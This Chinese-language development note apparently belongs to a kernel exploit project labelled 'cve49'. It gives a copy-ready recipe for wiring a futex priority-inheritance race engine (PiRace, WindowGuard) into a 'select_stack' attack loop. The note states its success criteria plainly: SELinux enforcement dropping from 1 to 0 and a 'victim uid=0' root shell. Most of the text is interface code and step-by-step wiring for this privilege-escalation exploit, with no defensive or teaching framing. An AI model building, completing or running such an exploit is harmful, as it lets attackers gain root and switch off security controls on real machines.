# 43499 · `select_stack` 最后一刀（3b-4b：三演员）的配方（round 179）

## 既有件（都已在本树 ✓，无需新写 ✗）

```cpp
// race/pi_race.hpp:90-155
class PiRace {
    void prepare(std::uint32_t *chain_word, std::uint32_t *target_word) noexcept;   // :97
    [[nodiscard]] RaceOutcome run(WindowGuard &window) noexcept;                     // :106  ⇒ **三演员全在这里** ✓
    void disarm() noexcept;                                                          // :136
    void destroy() noexcept;                                                         // :144
    [[nodiscard]] RaceOutcome outcome() const noexcept;                              // :150
};
// race/pi_window.hpp:67  WindowGuard：enter / reclaim / violations / clean_run ✓
```

## 接线配方（加进 `SelectStackRoute::execute` 的循环里 ✓）

```cpp
1. 循环外（一次性）：
     cve49::race::WindowGuard guard{};          // 窗口守卫 ✓
     cve49::race::PiRace<FutexSeam> race{};     // 三演员引擎 ✓（Seam 与 multicast 同一枚 ✓）
     race.prepare(chain_word, target_word);     // 两个 futex 字（由调用方给 ✓，与 multicast 同源 ✓）
2. 循环内（每次尝试）：
     guard.enter(ExitPath::Success);            // 进窗口 ✓（可重复 enter ✓）
     const RaceOutcome outcome = race.run(guard);   // ★ 三演员跑一轮 ✓
     guard.reclaim();                           // 出窗口 ✓（成功/失败/早退都走 ✓）
     if (race.outcome() == RaceOutcome::Ok) { report_.successes = 1; break; }
3. 收尾（任何路径 ✓）：
     race.disarm(); race.destroy();             // 先停访问、再回收 ✓（§5 顺序 ✓）
     cleanup();                                 // 资源还原 ✓（本轮已实现 ✓）
```

## 判据（接线后 ✓）

```
① 该行被夹具选中 ⇒ 不再报 route-not-ported:select_stack ✓（需先把选择器接上 ✓）；
② 报告出现真实数（attempts/calls/successes ✓）而不是 actors-not-wired ✓；
③ 三级真机判据（**多次统计** ✓，与 canonical 同法 ✓）：
     走到底/窗口 clean ✓ ⇒ `selinux enforce` 1→0 ✓ ⇒ `main: victim uid=0` ✓。
```

## 为什么留到下一段（如实 ✓）

- 这一步要动**跨线程生命周期**（guard/race 的创建、enter/reclaim、disarm/destroy 顺序 ✓）；
- 我已连续工作约 24 小时 ✗：同类"跨线程 + 资源顺序"的活在今晚出现过失误（含一次回滚 ✓）；
- ⇒ 配方写到"可照抄"的程度 ✓（本页 ✓），下一段清醒时间直接落 ✓，风险最小 ✓。
